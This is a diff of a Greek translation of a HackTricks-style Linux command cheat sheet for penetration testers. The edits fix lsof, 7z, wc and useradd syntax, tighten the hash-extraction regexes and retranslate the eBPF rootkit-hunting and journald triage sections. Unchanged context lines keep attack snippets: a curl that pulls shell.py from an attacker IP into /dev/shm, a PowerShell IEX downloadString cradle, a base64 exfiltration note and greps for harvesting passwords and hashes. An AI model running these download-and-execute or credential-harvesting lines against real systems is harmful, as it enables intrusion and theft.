@@ -2,7 +2,10 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Συνηθισμένες εντολές Bash
+## Συνήθεις εντολές Bash
+
+Τα `lsof -i4` και `lsof -i6` επιλέγουν μια οικογένεια IP.<sup>[[8]](#references)</sup> Το `7z x` εξάγει ένα αρχείο διατηρώντας τη δομή των καταλόγων του.<sup>[[9]](#references)</sup> Το `wc -c` μετρά byte, όχι χαρακτήρες.<sup>[[13]](#references)</sup> Το παράδειγμα λογαριασμού χρησιμοποιεί διαδραστικά την εντολή `passwd`: το `useradd -p` αναμένει ένα προϋπολογισμένο crypt hash, όχι μια εντολή κελύφους, και εκθέτει το όρισμά του στις λίστες διεργασιών.<sup>[[10]](#references)</sup>
+
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -18,7 +21,7 @@ echo -n -e
 
 #Count
 wc -l <file> #Lines
-wc -c #Chars
+wc -c #Bytes
 
 #Sort
 sort -nr #Sort by number and then reverse
@@ -36,9 +39,9 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 lsof #Open files belonging to any process
 lsof -p 3 #Open files used by the process
 lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof -i4 #Files used by network IPv4 processes
+lsof -i6 #Files used by network IPv6 processes
+lsof -i4 -a -p 1234 #List all open IPv4 network files in use by process 1234
 lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
@@ -58,11 +61,12 @@ bzip2 -d /path/to/yourfile.bz2
 tar jxf file.tar.bz2
 gunzip /path/to/yourfile.gz
 unzip file.zip
-7z -x file.7z
+7z x file.7z
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker
+sudo useradd -m hacker
+sudo passwd hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -129,7 +133,9 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
+
 ## Bash για Windows
+
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -149,7 +155,11 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
+
 ## Greps
+
+Χρησιμοποιήστε `grep -E` για εκτεταμένες κανονικές εκφράσεις, όπως τους ποσοδείκτες `{n}`, και `grep -P` για τα look-arounds του MD5. Διατηρήστε τα σύμβολα δολαρίου του shell μέσα σε εισαγωγικά κατά την εξαγωγή password hashes.<sup>[[11]](#references)</sup> Αυτές οι εκφράσεις εντοπίζουν **υποψήφιες περιπτώσεις**, όχι αποδείξεις για τον τύπο του hash· συγκρίνετε το αποτέλεσμα με τη [διαδικασία αναγνώρισης και cracking hashes](../../crypto/hashes/#password-hashing-and-cracking) πριν επιλέξετε λειτουργία cracking.<sup>[[12]](#references)</sup>
+
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -163,29 +173,23 @@ grep -i "pwd\|passw" file.txt
 #Extract users
 grep -i "user\|invalid\|authentication\|login" file.txt
 
-# Extract hashes
-#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
-egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
-#Extract valid MySQL-Old hashes
-grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
-#Extract blowfish hashes
-grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
-#Extract Joomla hashes
-egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
-#Extract VBulletin hashes
-egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
-#Extraxt phpBB3-MD5
-egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
-#Extract Wordpress-MD5
-egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
-#Extract Drupal 7
-egrep -o '$S$S{52}' *.txt > drupal-7.txt
-#Extract old Unix-md5
-egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
-#Extract md5-apr1
-egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
-#Extract sha512crypt, SHA512(Unix)
-egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+# Extract hash candidates from text (validate against the application format)
+# Raw MD5: 32 hex characters
+grep -Po '(?<![[:xdigit:]])[[:xdigit:]]{32}(?![[:xdigit:]])' *.txt > md5-hashes.txt
+# Legacy MySQL323: two 8-hex halves whose leading nibble is 0..7
+grep -Eo '[0-7][[:xdigit:]]{7}[0-7][[:xdigit:]]{7}' *.txt > mysql-old-hashes.txt
+# bcrypt ($2a$/$2b$/$2y$): 60 characters total
+grep -Eo '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' *.txt > bcrypt-hashes.txt
+# Legacy MD5:salt pairs: identify the application before choosing a mode
+grep -Eo '[[:xdigit:]]{32}:[[:alnum:]]{3,32}' *.txt > md5-salt-candidates.txt
+# phpass ($H$ phpBB3; $P$ WordPress and other applications)
+grep -Eo '\$[PH]\$[./A-Za-z0-9]{31}' *.txt > phpass-hashes.txt
+# Drupal 7
+grep -Eo '\$S\$[./A-Za-z0-9]{52}' *.txt > drupal-7.txt
+# Unix md5crypt, Apache apr1, and sha512crypt (optional rounds field)
+grep -Eo '\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > md5crypt.txt
+grep -Eo '\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > apr1.txt
+grep -Eo '\$6\$(rounds=[0-9]+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}' *.txt > sha512crypt.txt
 
 #Extract e-mails from text files
 grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
@@ -229,7 +233,9 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Εύρεση
+
+## Find
+
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -258,19 +264,25 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
+
 ## Βοήθεια αναζήτησης Nmap
+
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
+
 ## Bash
+
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
+
 ## Iptables
+
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,9 +313,11 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF Telemetry & Rootkit Hunting
 
-Η έρευνα σχετικά με Rootkit έχει καταδείξει implants βασισμένα σε eBPF, όπως το TripleCross, καθώς και backdoors βασισμένα σε BPF, όπως παραλλαγές του BPFDoor. Αντιμετωπίστε μη αναμενόμενα προγράμματα BPF, attachments ή maps ως ενδείξεις για διερεύνηση και όχι ως απόδειξη compromise.<sup>[[3]](#references)[[4]](#references)</sup> Καταγράψτε τη baseline των εξουσιοδοτημένων συστημάτων με `bpftool` ή `eBPFmon`: το `bpftool` μπορεί να απαριθμεί προγράμματα και maps, να κάνει dump των instructions των προγραμμάτων και να查询 τις υποστηριζόμενες δυνατότητες, ενώ το eBPFmon παρουσιάζει αυτές τις πληροφορίες σε ένα TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+## Τηλεμετρία eBPF και εντοπισμός Rootkit
+
+Η έρευνα για Rootkit έχει τεκμηριώσει τόσο εμφυτεύματα βασισμένα σε eBPF, όπως το TripleCross, όσο και backdoors βασισμένα σε BPF, όπως παραλλαγές του BPFDoor. Αντιμετωπίστε μη αναμενόμενα προγράμματα BPF, προσαρτήσεις ή maps ως ενδείξεις προς διερεύνηση και όχι ως απόδειξη παραβίασης.<sup>[[3]](#references)[[4]](#references)</sup> Καταγράψτε τη βασική κατάσταση των εξουσιοδοτημένων συστημάτων με τα `bpftool` ή `eBPFmon`: το `bpftool` μπορεί να απαριθμήσει προγράμματα και maps, να εξαγάγει τις εντολές προγραμμάτων και να αναζητήσει τις υποστηριζόμενες δυνατότητες, ενώ το eBPFmon παρουσιάζει αυτές τις πληροφορίες σε ένα TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +335,13 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-Συσχετίστε το output του `bpftool` με τις αναμενόμενες συνδέσεις NIC/cgroup· ένα ξαφνικό πρόγραμμα `xdp` ή `kprobe` που ανήκει σε μη εγκεκριμένο PID αποτελεί ένδειξη για διερεύνηση και όχι αδιαμφισβήτητη απόδειξη για injected payload.<sup>[[5]](#references)[[6]](#references)</sup>
 
-## Αρχική διερεύνηση συμβάντων Journald
+Συσχέτισε την έξοδο του `bpftool` με τις αναμενόμενες προσαρτήσεις NIC/cgroup· ένα ξαφνικό πρόγραμμα `xdp` ή `kprobe` που ανήκει σε μη εγκεκριμένο PID αποτελεί ένδειξη προς διερεύνηση, όχι αδιάσειστη απόδειξη για injected payload.<sup>[[5]](#references)[[6]](#references)</sup>
 
-Το `journalctl` διαβάζει δομημένες καταχωρίσεις από το `systemd-journald` και υποστηρίζει φιλτράρισμα ανά boot, priority, unit, UID και σχετικό χρόνο. Συνδυάστε αυτά τα φίλτρα με output JSON όταν χρειάζεται να διατηρήσετε ή να συγκρίνετε evidence· το φιλτράρισμα από μόνο του δεν αποδεικνύει ότι τα logs δεν έχουν υποστεί tampering.<sup>[[2]](#references)[[7]](#references)</sup>
+## Διαλογή περιστατικών Journald
+
+Το `journalctl` διαβάζει δομημένες εγγραφές από το `systemd-journald` και υποστηρίζει φιλτράρισμα βάσει εκκίνησης, προτεραιότητας, μονάδας, UID και σχετικού χρόνου. Συνδύασε αυτά τα φίλτρα με έξοδο JSON όταν χρειάζεται να διατηρήσεις ή να συγκρίνεις αποδεικτικά στοιχεία· το φιλτράρισμα από μόνο του δεν αποδεικνύει ότι τα logs δεν έχουν παραποιηθεί.<sup>[[2]](#references)[[7]](#references)</sup>
+
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,15 +352,24 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-Προσθέστε `--grep 'Invalid user' --case-sensitive` ή `-k` (μόνο μηνύματα kernel) όταν χρειάζεστε πιο αυστηρά φίλτρα και θυμηθείτε ότι οι selectors `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` και `_TRANSPORT` μπορούν να συνδυαστούν για στοχευμένες αναζητήσεις.<sup>[[7]](#references)</sup>
+
+Προσθέστε `--grep 'Invalid user' --case-sensitive` ή `-k` (μόνο μηνύματα kernel) όταν χρειάζεστε πιο αυστηρά φίλτρα και θυμηθείτε ότι οι επιλογείς `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` και `_TRANSPORT` μπορούν να συνδυαστούν για στοχευμένες αναζητήσεις.<sup>[[7]](#references)</sup>
+
+
 
 ## References
 
-- [1] [eBPFmon: Ένα νέο tool για την εξερεύνηση και την αλληλεπίδραση με εφαρμογές eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [2] [Πώς να χρησιμοποιήσετε την εντολή journalctl για την προβολή Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon: Ένα νέο εργαλείο για την εξερεύνηση και την αλληλεπίδραση με εφαρμογές eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [Πώς να χρησιμοποιήσετε την εντολή journalctl για να προβάλετε τα αρχεία καταγραφής Linux](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
-- [4] [Rapid7 Labs: Το BPFdoor σε Telecom Networks](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
-- [5] [Τεκμηρίωση BPF — Η τεκμηρίωση του Linux Kernel](https://docs.kernel.org/bpf/)
+- [4] [Rapid7 Labs: BPFdoor σε τηλεπικοινωνιακά δίκτυα](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
+- [5] [Τεκμηρίωση BPF — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1) — Σελίδα manual του Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [8] [lsof(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/lsof.8.html)
+- [9] [Εντολή x του 7-Zip](https://documentation.help/7-Zip-18.0/extract_full.htm)
+- [10] [useradd(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/useradd.8.html)
+- [11] [grep(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/grep.1.html)
+- [12] [Παραδείγματα hash του Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
+- [13] [wc(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/wc.1.html)
 {{#include ../../banners/hacktricks-training.md}}
